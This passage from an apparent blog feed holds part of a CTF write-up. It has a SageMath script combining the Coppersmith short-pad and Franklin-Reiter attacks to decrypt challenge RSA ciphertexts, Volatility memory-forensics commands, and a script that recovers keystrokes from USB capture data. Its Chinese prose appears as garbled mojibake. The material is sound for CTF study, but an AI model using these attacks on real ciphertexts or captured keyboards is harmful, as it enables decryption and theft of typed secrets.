operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sageÁéØÂ¢ÉÂèØ‰ª•Ëá™Â∑±ÂÆâË£ÖÔºå‰πüÂèØ‰ª•Âú®Á∫øËøêË°åÔºö<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>ËøôÂá†ÈÅìmiscÊÑüËßâ‰πüÂßøÂäøÊª°Êª°Âë¢„ÄÇÊØîÂ¶ÇÂÜÖÂ≠òÂèñËØÅÔºåusbÊµÅÈáèÂàÜÊûê„ÄÇ</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>È¶ñÂÖàÈúÄË¶ÅÁü•ÈÅìËøôÊòØ‰∏Ä‰∏™ÈïúÂÉèÊñá‰ª∂ÔºåËÄåkali‰∏ãÈù¢ÁöÑvolatilityÂèØ‰ª•ËøõË°åÂÜÖÂ≠òÂèñËØÅÔºåÂèØ‰ª•ÂèÇËÄÉËøô‰∏ÄÁØáÊñáÁ´†Ôºö<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTFÂÜÖÂ≠òÂèñËØÅ</a></p><p>ÊâßË°åÂëΩ‰ª§<code>volatility -f mem.data imageinfo</code>ÂèØ‰ª•ÁúãÂà∞ÈïúÂÉè‰ø°ÊÅØÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>Êü•ÁúãËøõÁ®ãÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" class="lazyload"></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump Âá∫ÁöÑÊñá‰ª∂‰øùÂ≠òÁöÑÁõÆÂΩï]**</code>ÂØºÂá∫ÊåáÂÆöËøõÁ®ãÊï∞ÊçÆÔºö</p><p>gimpÂèØ‰ª•ËØªÂèñ.dataÊñá‰ª∂Ôºå‰ªéÂéüÂßãÊï∞ÊçÆ‰∏≠ËΩΩÂÖ•ÂõæÂÉèÔºàÈúÄË¶ÅÊ≥®ÊÑèË∞ÉÊï¥ÁöÑÊòØÂÆΩÂ∫¶ÔºåËøô‰∏™ÊúÄÈáçË¶ÅÔºåÂΩìÂÆΩÂ∫¶‰∏∫1457Êó∂ÊúÄÊé•ËøëÂéüÂõæÔºåÁÑ∂ÂêéË∂äÂ§ßÂ∞±Ë∂ä‰∏çÂÆπÊòìÊâæÂà∞ÔºâÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" class="lazyload"></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>ÈÄöËøáÊèêÂèñÂπ∂‰∏îËß£ÂØÜusbÊµÅÈáèÂèØ‰ª•ÂæóÂà∞‰∏ÄÊÆµ malbolge ÁöÑ‰ª£Á†ÅÔºå‰πãÂâçÂú®‰∏≠ÁßëÂ§ßÊ†°Ëµõ‰∏äÈù¢‰πüÂÅöËøáüòÑ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂèØ‰ª•google‰∏äÈù¢Êêú‰∏™ÁºñËØëÂô®ËøêË°å‰∏Ä‰∏ãÔºå‰∏çÂêåÁöÑÁºñËØëÂô®ÊïàÊûúÂèØËÉΩ‰∏ç‰∏ÄÊ†∑ÔºåÊúâÂèØËÉΩËøô‰∏™ÁºñËØëÂô®ÊúâÁî®ÔºåÂè¶Â§ñ‰∏Ä‰∏™Ê≤°Áî®„ÄÇ„ÄÇ</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"&lt;TAB>"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># check argv</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get argv</span>    pcapFilePath <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># get data of pcap</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"tshark -r %s -T fields -e usb.capdata > %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pcapFilePath<span class="token punctuation">,</span> DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># read data</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>DataFileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            presses<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># handle</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> press <span class="token keyword">in</span> presses<span class="token punctuation">:</span>        Bytes <span class="token operator">=</span> press<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> normalKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"02"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># shift key is pressed.</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"01"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">"Ctrl+"</span> <span class="token operator">+</span> shiftKeys<span class="token punctuation">[</span>Bytes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[-] Unknow Key : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Bytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># clean the temp data</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm ./%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>DataFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>ÂæÖÊõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
      <category term="‰ø°ÊÅØÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ÊàëÊòØ‰∏Ä‰∏™ËèúÈ∏°</title>
    <link href="http://www.yof3ng.xyz/2018/11/11/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E8%8F%9C%E9%B8%A1/"/>
    <id>http://www.yof3ng.xyz/2018/11/11/ÊàëÊòØ‰∏Ä‰∏™ËèúÈ∏°/</id>
    <published>2018-11-11T13:50:58.000Z</published>
    <updated>2019-04-02T08:46:45.788Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËèúÈ∏°"><a href="#ËèúÈ∏°" class="headerlink" title="ËèúÈ∏°"></a>ËèúÈ∏°</h1><p>‰Ω†ÊÄé‰πàËøô‰πàËèúÂïäÔºÅÈ∏Ω‰∫Ü‰∫îÂ§©‰∫ÜÔºÅË¶ÅÂÅöÈ¢ìÂ∫üËèúÈ∏°‰∫ÜÂêóüò≠ÔºÅ‰Ω†ÂèàlowÂèàËèúËøò‰∏çÂä™ÂäõÔºåÂèàÊÉ≥ÈöèÊ≥¢ÈÄêÊµÅÔºàÂí∏È±ºÁúüÈ¶ôüòÑÔºâ„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="ÊùÇÊñá" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
